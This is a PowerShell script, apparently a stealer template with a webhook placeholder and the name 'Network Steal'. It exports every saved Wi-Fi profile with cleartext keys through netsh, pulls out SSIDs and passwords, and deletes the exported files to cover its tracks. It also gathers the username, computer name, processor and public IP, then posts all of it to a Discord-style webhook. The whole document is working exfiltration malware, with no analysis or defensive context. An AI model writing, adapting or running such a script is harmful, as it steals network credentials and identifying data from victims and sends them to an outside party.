[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
[System.Collections.ArrayList]$embeds = @();

$Webhook = "{PACKAGE.WEBHOOKURL}";


$color = 7946683;
$footer = [PSCustomObject]@{
    icon_url = "https://github.com/Rawiros.png"
    text = "github.com/Rawiros"
}

$IP = Invoke-RestMethod -Uri "https://api.myip.com";
$Processor = (Get-WmiObject -class win32_processor);
$Null = netsh wlan export profile key=clear
$Profiles = (Get-ChildItem -Path $PWD -Filter '*.xml').forEach{
    $xml=[xml](Get-Content $PSItem)

    [PSCustomObject]@{
        SSID     = $xml.WLANProfile.SSIDConfig.SSID.name 
        Password = $xml.WLANProfile.MSM.Security.sharedKey.keymaterial
        Authentication = $xml.WLANProfile.MSM.Security.authEncryption.authentication
    }

    Remove-Item $PSItem
} | Format-Table | out-string

$embeds.Add([PSCustomObject]@{
    title = "User Info"
    footer = $footer
    color = $color
    fields = @( #NAPRAWIC
        [PSCustomObject]@{
            name = "Username"
            value = $ENV:USERNAME | Out-String
        },
        [PSCustomObject]@{
            name = "Computer Name"
            value = $ENV:COMPUTERNAME | Out-String
        }
    )
});

$embeds.Add([PSCustomObject]@{
    title = "Processor"
    footer = $footer
    color = $color
    fields = @(
        [PSCustomObject]@{
            name = "Name"
            value = $Processor.Name | Out-String
        },
        [PSCustomObject]@{
            name = "Max Clock Speed"
            value = $Processor.MaxClockSpeed | Out-String
        }
)
});

$embeds.Add([PSCustomObject]@{
    title = "IP Address"
    footer = $footer
    color = $color
    thumbnail = [PSCustomObject]@{
        url = "https://countryflagsapi.com/png/$($IP.cc)"
    }
    fields = @(
        [PSCustomObject]@{
            name = "IP"
            value = $IP.ip | Out-String
        },
        [PSCustomObject]@{
            name = "Country"
            value = $IP.country
        },
        [PSCustomObject]@{
            name = "Flag"
            value = ":flag_$($IP.cc.toLower()):"
        }
        [PSCustomObject]@{
            name = "Raw Data"
            value = "``````json`n$($IP | ConvertTo-Json)``````"
        }
)
});

$data = [PSCustomObject]@{
    username = "Network Steal"
    embeds = $embeds
    content = "```````n$($Profiles)``````"
} | ConvertTo-Json -Depth 10

Invoke-RestMethod -Uri $Webhook -Body $data -Method Post -ContentType 'application/json'
